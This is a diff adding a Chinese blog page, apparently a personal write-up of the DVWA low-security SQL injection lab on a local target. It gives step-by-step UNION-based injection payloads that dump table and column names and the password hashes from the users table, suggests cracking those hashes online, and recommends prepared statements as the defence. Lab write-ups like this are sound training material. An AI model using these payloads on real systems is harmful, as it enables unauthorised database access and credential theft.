@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DVWA-Low-SQL注入 (SQL Injection) - Y11516</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=Orbitron:wght@700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #0a0e17; background-image: radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 50%); font-family: 'Inter', sans-serif; color: #ccd6f6; padding: 6rem 1rem 4rem 1rem; display: flex; justify-content: center; line-height: 1.8; }
+        .navbar { position: fixed; top: 0; left: 0; width: 100%; padding: 1.2rem 5%; display: flex; justify-content: space-between; align-items: center; background: rgba(10, 14, 23, 0.7); backdrop-filter: blur(12px); border-bottom: 1px solid rgba(0, 240, 255, 0.15); z-index: 999; }
+        .logo { font-family: 'Orbitron', sans-serif; font-weight: 900; font-size: 1.2rem; color: #00f0ff; letter-spacing: 2px; }
+        .nav-links a { color: #8892b0; text-decoration: none; margin-left: 2rem; font-size: 0.9rem; transition: 0.3s; }
+        .nav-links a:hover { color: #00f0ff; }
+        .post-container { max-width: 820px; width: 100%; background: rgba(255,255,255,0.03); backdrop-filter: blur(6px); border: 1px solid rgba(255,255,255,0.06); border-radius: 32px; padding: 3rem; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.6); }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 2.2rem; margin-bottom: 0.5rem; color: #00f0ff; text-shadow: 0 0 15px rgba(0, 240, 255, 0.3); }
+        .date { color: #475569; font-size: 0.9rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid rgba(0, 240, 255, 0.2); display: flex; gap: 15px; flex-wrap: wrap;}
+        .date span { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.8rem; border-radius: 12px; color: #00f0ff; font-size: 0.8rem; }
+        h2 { color: #a855f7; font-size: 1.4rem; margin: 2.5rem 0 1rem 0; border-left: 4px solid #a855f7; padding-left: 10px; }
+        h3 { color: #e2e8f0; font-size: 1.15rem; margin: 1.8rem 0 0.8rem 0; }
+        h4 { color: #c084fc; font-size: 1rem; margin: 1.2rem 0 0.6rem 0; }
+        p { margin-bottom: 1rem; color: #94a3b8; }
+        strong { color: #e2e8f0; }
+        code { background: rgba(0, 240, 255, 0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: 'Courier New', monospace; color: #00f0ff; font-size: 0.95rem; }
+        pre { background: #0f172a; padding: 1rem; border-radius: 8px; overflow-x: auto; border: 1px solid #1e293b; margin-bottom: 1rem; }
+        pre code { background: transparent; padding: 0; color: #e2e8f0; }
+        ul, ol { padding-left: 1.5rem; margin-bottom: 1rem; color: #94a3b8; }
+        li { margin-bottom: 0.5rem; }
+        .highlight-box { background: rgba(168, 85, 247, 0.05); border: 1px solid rgba(168, 85, 247, 0.2); border-radius: 12px; padding: 1.5rem; margin-bottom: 1rem; }
+        .note-box { background: rgba(0, 240, 255, 0.05); border-left: 3px solid #00f0ff; padding: 1rem; margin-bottom: 1rem; border-radius: 0 8px 8px 0; }
+        .action-bar { display: flex; justify-content: center; gap: 1.5rem; margin-top: 3rem; flex-wrap: wrap; }
+        .action-link { color: #00f0ff; text-decoration: none; border: 1px solid #00f0ff; padding: 10px 24px; border-radius: 30px; transition: 0.3s; }
+        .action-link:hover { background: rgba(0, 240, 255, 0.1); }
+        .action-link.secondary { color: #8892b0; border-color: #475569; }
+        @media (max-width: 640px) { .post-container { padding: 1.5rem; } h1 { font-size: 1.5rem; } .action-bar { flex-direction: column; } }
+    </style>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo"><i class="fas fa-shield-halved"></i> Y11516</div>
+        <div class="nav-links">
+            <a href="/ctf.html"><i class="fas fa-bug"></i> CTF 总库</a>
+            <a href="/"><i class="fas fa-house"></i> 主页</a>
+        </div>
+    </nav>
+
+    <div class="post-container">
+        <h1><i class="fas fa-database"></i> DVWA-Low-SQL注入 (SQL Injection)</h1>
+        <div class="date">
+            <span><i class="far fa-calendar-alt"></i> 2026年10月2日</span>
+            <span><i class="fas fa-tag"></i> DVWA</span>
+            <span><i class="fas fa-tag"></i> Web安全</span>
+            <span><i class="fas fa-tag"></i> SQL注入</span>
+            <span><i class="fas fa-tag"></i> UNION查询</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>DVWA SQL Injection (Low)</li>
+            <li><strong>题目平台：</strong>DVWA (本地 Docker / 灵境靶场)</li>
+            <li><strong>题目类型：</strong>Web安全 / SQL注入 / GET型字符型注入</li>
+            <li><strong>靶场链接：</strong>http://192.168.242.80/vulnerabilities/sqli/</li>
+            <li><strong>涉及工具：</strong>Google Chrome 浏览器、Burp Suite</li>
+        </ul>
+
+        <h2>二、解题步骤</h2>
+        
+        <h3>1. 分析题目考什么</h3>
+        <p>本题的核心考点是<strong>SQL注入（SQL Injection）</strong>。后端代码直接将用户输入的 <code>User ID</code> 拼接到 SQL 查询语句中，没有进行任何过滤。攻击者可以利用单引号闭合原语句，并使用 <code>UNION</code> 联合查询获取数据库中的任意数据。</p>
+
+        <h3>2. 怎么想（破题思路）</h3>
+        <ul>
+            <li>输入 <code>1</code>，正常回显 <code>admin</code>，确认业务功能。</li>
+            <li>输入 <code>1'</code>，页面报错，确认存在 SQL 注入，且闭合方式为单引号。</li>
+            <li>使用 <code>ORDER BY</code> 判断字段数，确定当前查询返回 2 个字段。</li>
+            <li>利用 <code>UNION SELECT</code> 将恶意查询结果回显到页面上，逐步提取数据库名、表名、列名，最终获取用户密码哈希。</li>
+        </ul>
+
+        <h3>3. 怎么解（详细步骤与踩坑记录）</h3>
+        
+        <div class="note-box">
+            <h4><i class="fas fa-exclamation-triangle"></i> 踩坑记录：URL 编码与特殊符号处理</h4>
+            <p><strong>踩坑情况：</strong>在构造复杂的 UNION 查询时，输入到浏览器地址栏或输入框中的内容如果包含空格、单引号，可能会导致解析错误。</p>
+            <p><strong>原因分析：</strong>浏览器地址栏会自动对特殊字符进行 URL 编码（如空格变成 <code>+</code> 或 <code>%20</code>），导致 Payload 在传输过程中变形。</p>
+            <p><strong>改进方式：</strong>尽量在 Burp Suite 的 Repeater 模块中构造和发送注入请求，或者在地址栏手动将空格替换为 <code>+</code> 或 <code>%20</code>，确保 Payload 原样传输。</p>
+        </div>
+
+        <div class="highlight-box">
+            <h4><i class="fas fa-terminal"></i> 详细实操步骤（Payload逐字解释）</h4>
+            
+            <p><strong>第一步：判断闭合方式</strong></p>
+            <p>输入：<code>1'</code></p>
+            <p><strong>响应结果：</strong>页面报错 <code>You have an error in your SQL syntax...</code>，说明原 SQL 语句是单引号闭合的字符型注入。</p>
+
+            <p><strong>第二步：判断字段数</strong></p>
+            <p>输入：<code>1' ORDER BY 1-- -</code> （正常）</p>
+            <p>输入：<code>1' ORDER BY 2-- -</code> （正常）</p>
+            <p>输入：<code>1' ORDER BY 3-- -</code> （报错）</p>
+            <p><strong>结论：</strong>当前查询返回 2 个字段。这里的 <code>-- -</code> 是 SQL 注释符，用于注释掉原语句后面的单引号和逻辑。</p>
+
+            <p><strong>第三步：UNION 联合查询爆数据</strong></p>
+            <p>查看回显位置：<code>1' UNION SELECT 1,2-- -</code></p>
+            <p>获取数据库名与版本：<code>1' UNION SELECT database(), version()-- -</code></p>
+            <p>获取所有表名：<code>1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -</code></p>
+            <p>获取 users 表的字段名：<code>1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -</code></p>
+            <p>获取用户名和密码哈希：<code>1' UNION SELECT user, password FROM users-- -</code></p>
+            <p><strong>响应结果：</strong>页面回显了所有用户的账号和 MD5 密码哈希值。将其放入 <code>cmd5.com</code> 等解密网站，即可获取明文密码。</p>
+        </div>
+
+        <h3>4. 怎么迁移（跨领域联想）</h3>
+        <ul>
+            <li><strong>真实场景：</strong>很多老旧的企业官网或 OA 系统，其新闻详情页的 <code>?id=xxx</code> 参数就是典型的 SQL 注入点。攻击者通过注入获取管理员密码，登录后台后上传 WebShell，最终控制整个服务器。</li>
+            <li><strong>防御策略：</strong>无论什么语言，必须使用<strong>预编译（Prepared Statements）</strong>。将 SQL 语句的“代码”与“数据”彻底分离，让数据库引擎无法把用户输入当作指令执行。</li>
+        </ul>
+
+        <h2>三、名词大全与原理深度复盘</h2>
+        
+        <div class="highlight-box">
+            <h4>1. SQL注入 (SQL Injection)</h4>
+            <p>攻击者将恶意的 SQL 代码插入到应用的输入参数中，欺骗后端数据库执行非预期的查询，从而窃取数据、篡改数据甚至获取系统权限。</p>
+
+            <h4>2. UNION 联合查询</h4>
+            <p>SQL 中的一种操作符，用于合并两个或多个 SELECT 语句的结果集。在注入中，攻击者利用它将恶意查询的结果拼接到正常查询结果后，从而在页面上直接回显数据。</p>
+
+            <h4>3. information_schema</h4>
+            <p>MySQL 的系统数据库，存储了所有数据库、表、列的名称。它是 SQL 注入中获取元数据的“藏宝图”。</p>
+
+            <h4>4. group_concat()</h4>
+            <p>MySQL 的聚合函数，用于将查询结果的多行合并为一个字符串。在受限次数的注入中非常关键，它能让我们一次性获取所有表名或列名。</p>
+
+            <h4>5. 预编译 (Prepared Statements)</h4>
+            <p>防御 SQL 注入的最有效手段。它先将 SQL 语句模板发送给数据库编译，然后再将用户输入作为纯数据传入。数据库不会再把用户输入当作 SQL 代码解析，从根本上杜绝了注入。</p>
+        </div>
+
+        <h2>四、题目思考</h2>
+        
+        <h3>1. 这跟前面的题有什么区别？</h3>
+        <ul>
+            <li><strong>与 SQL 盲注的区别：</strong>本题是普通的 UNION 注入，有回显位，可以一次性爆出大量数据。而盲注（如 SQL Injection Blind）没有回显，只能通过页面状态或时间延迟逐字符推断，效率极低。</li>
+            <li><strong>与命令注入的区别：</strong>SQL 注入攻击的是数据库层，而命令注入攻击的是操作系统层。在权限上，命令注入通常危害更大。</li>
+        </ul>
+
+        <h3>2. 这种题目的出现原因（为什么存在）</h3>
+        <p>漏洞存在的根本原因在于<strong>代码直接拼接 SQL 语句</strong>。例如：<code>$query = "SELECT * FROM users WHERE id = '$id';";</code>。开发者把用户输入当作了 SQL 代码的一部分。</p>
+        <p>从历史角度看，这在 2000 年代初的 Web 开发中非常普遍。当时很多开发者为了快速实现功能，忽略了安全设计，导致了大量网站被 SQL 注入攻破，著名的 2011 年索尼 PSN 被黑事件就是典型案例。</p>
+
+        <h3>3. 这种的应用</h3>
+        <p>在护网中，SQL 注入是“外网打点”的最高频漏洞之一。攻击者通过 SQL 注入获取数据库中的管理员账号密码，登录后台后寻找文件上传点，最终拿到 WebShell，进入内网。</p>
+
+        <h3>4. 如何抽象理解概念（大白话）</h3>
+        <div class="highlight-box">
+            <p><strong>把 SQL 注入比作“点餐”：</strong></p>
+            <ul>
+                <li>正常情况：你告诉服务员：“我要一份牛肉面。”（输入 <code>1</code>）</li>
+                <li>恶意情况：你告诉服务员：“我要一份牛肉面，并且把后厨的所有菜谱都给我。”（输入 <code>1' UNION SELECT ...</code>）</li>
+                <li>如果服务员不加思考（没做过滤），他真的会把菜谱也拿给你。这就是 SQL 注入。</li>
+            </ul>
+        </div>
+
+        <p style="margin-top: 2rem; text-align: center; color: #475569;"><i class="fas fa-code"></i> 做一道题，就要往自己脑子里装点东西。</p>
+
+        <div class="action-bar">
+            <a href="/ctf.html" class="action-link"><i class="fas fa-arrow-left"></i> 返回 CTF 总库</a>
+            <a href="/" class="action-link secondary"><i class="fas fa-house"></i> 返回主页</a>
+        </div>
+    </div>
+</body>
+</html>
